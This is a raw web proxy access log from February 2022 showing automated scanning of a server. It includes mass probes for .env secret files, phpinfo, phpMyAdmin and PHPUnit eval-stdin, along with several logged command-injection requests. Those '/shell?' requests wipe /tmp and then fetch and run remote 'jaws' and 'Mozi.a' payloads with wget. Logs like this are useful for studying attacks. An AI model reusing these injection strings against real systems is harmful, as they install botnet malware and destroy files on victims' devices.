[2022-02-05T14:15:46.549Z] "- - HTTP/2" 0 DPE 0 0 1 - --185.239.209.224++ - - - -
[2022-02-05T15:00:50.415Z] "GET / HTTP/1.1" 301 - 0 0 0 - 103.203.59.1 "HTTP Banner Detection (https://security.ipip.net)" ? ?IP? -
[2022-02-05T15:06:20.982Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 209.127.186.246 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
[2022-02-05T15:06:21.809Z] "POST / HTTP/1.1" 301 - 0 0 0 - 209.127.186.246 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
[2022-02-05T16:07:06.934Z] "GET / HTTP/1.1" 301 - 0 0 0 - 91.90.123.84 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36" ? ?IP? -
[2022-02-05T16:08:10.678Z] "GET /ip HTTP/1.1" 301 - 0 0 0 - 222.186.138.137 "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36" ? httpbin.org -
[2022-02-05T16:08:10.680Z] "GET /ip HTTP/1.1" 301 - 0 0 0 - 222.186.138.137 "Mozilla/5.0 (X11; U; Linux i686; en-US) AppleWebKit/534.13 (KHTML, like Gecko) Chrome/9.0.597.84 Safari/534.13" ? httpbin.org -
[2022-02-05T16:08:10.694Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --222.186.138.137++ - - - -
[2022-02-05T16:08:11.203Z] "CONNECT - HTTP/1.1" 404 NR 0 0 0 - 222.186.138.137 Go-http-client/1.1 ? httpbin.org:443 -
[2022-02-05T16:08:14.322Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --222.186.138.137++ - - - -
[2022-02-05T16:08:22.807Z] "HEAD / HTTP/1.1" 301 - 0 0 2 - 221.213.75.118 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3239.132 Safari/537.36" ? 110.242.68.4 -
[2022-02-05T16:08:23.202Z] "CONNECT - HTTP/1.1" 404 NR 0 0 0 - 180.95.238.213 "PycURL/7.43.0 libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3" ? 110.242.68.4:443 -
[2022-02-05T17:27:03.949Z] "GET / HTTP/1.0" 426 - 0 0 0 - --190.19.164.38++ - - ?IP? -
[2022-02-05T18:13:40.387Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.138.118 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" ? ?IP? -
[2022-02-05T18:41:11.299Z] "CONNECT - HTTP/1.1" 404 NR 0 0 0 - 185.244.164.69 - ? 45.81.234.68:4444 -
[2022-02-05T18:56:42.731Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 20.88.17.169 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
[2022-02-05T18:56:43.555Z] "POST / HTTP/1.1" 301 - 0 0 0 - 20.88.17.169 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
[2022-02-05T19:26:03.721Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws HTTP/1.1" 301 - 0 0 0 - 189.130.168.241 "Hello, world" ? 127.0.0.1:80 -
[2022-02-05T19:30:12.328Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 301 - 0 0 0 - 120.85.115.111 "Hello, world" ? ?:? -
[2022-02-05T19:39:11.660Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --161.35.86.181++ - - - -
[2022-02-05T19:39:19.630Z] "GET /.json HTTP/1.1" 301 - 0 0 0 - 161.35.86.181 l9explore/1.3.0 ? ?IP? -
[2022-02-05T19:39:20.210Z] "GET /login.action HTTP/1.1" 301 - 0 0 0 - 161.35.86.181 l9explore/1.3.0 ? ?IP? -
[2022-02-05T19:39:20.704Z] "GET /idx_config/ HTTP/1.1" 301 - 0 0 0 - 161.35.86.181 l9explore/1.3.0 ? ?IP? -
[2022-02-05T19:39:24.338Z] "GET / HTTP/1.1" 301 - 0 0 0 - 209.141.36.112 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" ? ?IP? -
[2022-02-05T19:39:33.706Z] "GET /favicon.ico HTTP/1.1" 301 - 0 0 0 - 209.141.36.112 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" ? ?IP? -
[2022-02-05T19:39:36.963Z] "GET / HTTP/1.1" 301 - 0 0 0 - 209.141.36.231 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36" ? ?DOMAIN? -
[2022-02-05T19:39:40.087Z] "GET / HTTP/1.1" 301 - 0 0 0 - 8.26.182.170 "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" ? ?DOMAIN? -
[2022-02-05T22:01:44.188Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.146.60 - ? ?:? -
[2022-02-05T22:01:44.703Z] "GET / HTTP/1.1" 301 - 0 0 0 - 167.94.146.60 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" ? ?IP? -
[2022-02-05T22:58:52.587Z] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 301 - 0 0 0 - 192.241.207.214 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
[2022-02-05T23:19:38.324Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 103.207.42.130 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
[2022-02-05T23:19:39.412Z] "POST / HTTP/1.1" 301 - 0 0 0 - 103.207.42.130 "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30" ? ?IP? -
[2022-02-05T23:22:39.022Z] "POST /web_shell_cmd.gch HTTP/1.1" 301 - 0 0 0 - 191.239.248.18 Go-http-client/1.1 ? ?IP? -
[2022-02-05T23:26:34.196Z] "GET /ReportServer HTTP/1.1" 301 - 0 0 0 - 192.241.207.51 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
[2022-02-06T00:31:17.686Z] "GET / HTTP/1.1" 301 - 0 0 0 - 38.242.201.28 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" ? ?:? -
[2022-02-06T01:49:05.937Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 212.192.241.207 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
[2022-02-06T01:49:06.444Z] "POST / HTTP/1.1" 301 - 0 0 0 - 212.192.241.207 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
[2022-02-06T02:37:28.093Z] "GET /?config HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" ? ?IP? -
[2022-02-06T02:42:31.949Z] "- - HTTP/1.1" 400 DPE 0 11 0 - --138.68.249.116++ - - - -
[2022-02-06T02:47:08.285Z] "GET /c.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/4.77 [en] (X11; I; IRIX;64 6.5 IP30)" ? ?IP? -
[2022-02-06T04:30:31.780Z] "GET / HTTP/1.1" 301 - 0 0 0 - 154.209.125.36 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0" ? ?:? -
[2022-02-06T04:37:59.431Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 173.63.188.95 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
[2022-02-06T04:38:01.845Z] "POST / HTTP/1.1" 301 - 0 0 0 - 173.63.188.95 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36" ? ?IP? -
[2022-02-06T04:57:12.199Z] "GET / HTTP/1.1" 301 - 0 0 0 - 164.90.201.209 "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)" ? ?IP? -
[2022-02-06T05:57:27.210Z] "GET / HTTP/1.0" 426 - 0 0 0 - --119.202.103.80++ "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)" - ?IP? -
[2022-02-06T08:17:39.330Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 20.119.41.254 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" ? ?IP? -
[2022-02-06T08:46:01.440Z] "GET /actuator/health HTTP/1.1" 301 - 0 0 0 - 192.241.206.31 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
[2022-02-06T08:46:57.754Z] "POST /phpinfo.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Linux; Android 9; MI 8 SE Build/PKQ1.181121.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/66.0.3359.126 MQQBrowser/6.2 TBS/044807 Mobile Safari/537.36 MMWEBID/7941 MicroMessenger/7.0.6.1460(0x27000634) Process/tools NetType/WIFI Language/zh_CN" ? ?IP? -
[2022-02-06T08:56:38.636Z] "POST /pdf/phpinfo.ph HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Linux; Android 8.0.0; F5321) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36" ? ?IP? -
[2022-02-06T09:06:20.215Z] "POST /games/phpinfo.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.92 Safari/537.36" ? ?IP? -
[2022-02-06T09:09:20.209Z] "GET / HTTP/1.1" 301 - 0 0 0 - 178.46.82.26 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:? -
[2022-02-06T09:15:59.257Z] "POST /repository/phpinfo.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Opera/9.80 (Linux i686; Opera Mobi/1040; U; en) Presto/2.5.24 Version/10.00" ? ?IP? -
[2022-02-06T09:19:19.821Z] "GET /.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.837Z] "GET /conf/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.846Z] "GET /wp-content/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.872Z] "GET /wp-admin/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.879Z] "GET /library/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.888Z] "GET /new/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.902Z] "GET /vendor/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.919Z] "GET /old/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.934Z] "GET /local/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.948Z] "GET /api/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.956Z] "GET /blog/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.964Z] "GET /crm/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.973Z] "GET /admin/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.980Z] "GET /laravel/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.989Z] "GET /app/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:19.999Z] "GET /app/config/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.025Z] "GET /apps/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.043Z] "GET /audio/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.054Z] "GET /cgi-bin/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.070Z] "GET /backend/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.077Z] "GET /src/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.108Z] "GET /base/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.138Z] "GET /core/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.147Z] "GET /vendor/laravel/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.153Z] "GET /storage/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.160Z] "GET /protected/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.172Z] "GET /newsite/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.185Z] "GET /www/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.195Z] "GET /sites/all/libraries/mailchimp/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.203Z] "GET /database/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.218Z] "GET /public/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.708Z] "GET /?IP?.ip.?VENDOR?usercontent.com/.env HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.773Z] "POST / HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:19:20.855Z] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 301 - 0 0 0 - 194.233.78.120 "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36" ? ?IP? -
[2022-02-06T09:25:39.309Z] "POST /download/phpinfo.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" ? ?IP? -
[2022-02-06T09:35:18.398Z] "POST /wpinfo.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-GB; rv:1.9.1.17) Gecko/20110123 (like Firefox/3.x) SeaMonkey/2.0.12" ? ?IP? -
[2022-02-06T09:44:57.242Z] "POST /info.php HTTP/1.1" 301 - 0 0 0 - 148.251.173.52 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.110 Safari/537.36 Vivaldi/2.7.1628.28" ? ?IP? -
[2022-02-06T10:39:53.037Z] "GET / HTTP/1.1" 301 - 0 0 0 - 162.142.125.10 - ? ?:? -
[2022-02-06T10:39:54.372Z] "GET / HTTP/1.1" 301 - 0 0 0 - 162.142.125.10 "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)" ? ?IP? -
[2022-02-06T11:31:15.945Z] "GET / HTTP/1.1" 301 - 0 0 0 - 195.9.112.6 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:? -
[2022-02-06T12:09:08.865Z] "GET / HTTP/1.1" 301 - 0 0 0 - 177.223.58.67 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:? -
[2022-02-06T12:11:20.408Z] "GET / HTTP/1.1" 301 - 0 0 0 - 192.241.206.141 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
[2022-02-06T12:43:21.464Z] "GET /shell?cd+/tmp;rm+-rf+*;wget+net.joostjansen.ml/jaws;sh+/tmp/jaws HTTP/1.1" 301 - 0 0 0 - 222.233.232.186 "Hello, world" ? 127.0.0.1:80 -
[2022-02-06T13:05:41.695Z] "GET / HTTP/1.1" 301 - 0 0 0 - 161.97.106.237 "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0" ? ?:? -
[2022-02-06T13:11:11.329Z] "GET / HTTP/1.1" 301 - 0 0 0 - 98.42.196.72 - ? ?IP? -
[2022-02-06T13:11:14.947Z] "GET / HTTP/1.1" 301 - 0 0 0 - 192.241.202.218 "Mozilla/5.0 zgrab/0.x" ? ?IP? -
[2022-02-06T13:15:09.223Z] "GET / HTTP/1.1" 301 - 0 0 0 - 103.215.203.83 "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" ? ?:? -
[2022-02-06T14:00:37.633Z] "GET / HTTP/1.1" 301 - 0 0 0 - 124.223.22.129 "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One)  AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.1328.24 Safari/537.36" ? ?IP? -
[2022-02-06T14:09:36.946Z] "GET / HTTP/1.1" 301 - 0 0 1 - 20.94.64.74 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" ? ?IP? -
[2022-02-06T14:21:17.959Z] "GET / HTTP/1.1" 301 - 0 0 0 - 20.94.64.74 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" ? ?IP? -
[2022-02-06T15:03:39.579Z] "GET / HTTP/1.1" 301 - 0 0 0 - 20.94.64.74 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" ? ?IP? -
[2022-02-06T16:40:42.021Z] "GET /phpmyadmin/index.php HTTP/1.1" 301 - 0 0 0 - 124.223.22.129 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36" ? ?IP? -
[2022-02-06T16:40:43.668Z] "GET /pmd/index.php HTTP/1.1" 301 - 0 0 0 - 124.223.22.129 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36" ? ?IP? -
[2022-02-06T16:40:44.604Z] "GET /phpmyadmin4.8.5/index.php HTTP/1.1" 301 - 0 0 0 - 124.223.22.129 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3464.0 Safari/537.36" ? ?IP? -
[2022-02-06T16:47:18.190Z] "GET /robots.txt HTTP/1.1" 301 - 0 0 0 - 186.179.75.202 "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0" ? ?IP? -
[2022-02-06T16:47:18.491Z] "POST /Admin1229a28b/Login.php HTTP/1.1" 301 - 0 0 0 - 186.179.75.202 "Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0" ? ?IP? -
[2022-02-06T16:47:19.086Z] "GET / HTTP/1.1" 301 - 0 0 0 - 186.179.75.202 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" ? ?IP? -
[2022-02-06T16:47:19.386Z] "GET /l.php HTTP/1.1" 301 - 0 0 0 - 186.179.75.202 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" ? ?IP? -
[2022-02-06T16:47:19.686Z] "GET /phpinfo.php HTTP/1.1" 301 - 0 0 0 - 186.179.75.202 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" ? ?IP? -
[2022-02-06T16:47:19.986Z] "GET /test.php HTTP/1.1" 301 - 0 0 0 - 186.179.75.202 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" ? ?IP? -
